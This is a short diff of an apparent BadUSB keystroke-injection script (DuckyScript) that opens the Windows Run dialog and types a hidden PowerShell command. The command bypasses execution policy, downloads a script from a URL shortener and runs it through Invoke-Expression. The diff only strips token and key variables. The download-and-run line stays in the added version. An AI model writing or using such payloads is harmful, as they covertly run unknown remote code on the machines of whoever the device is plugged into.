@@ -50,5 +50,5 @@ ENTER
 DELAY 600
 GUI r
 DELAY 1000
-STRING powershell -w h -NoP -Ep Bypass $token='';$key='';$idList='';irm https://shorturl.at/gpvF5 | iex | iex
+STRING powershell -w h -NoP -Ep Bypass ;irm https://shorturl.at/gpvF5 | iex | iex
 ENTER
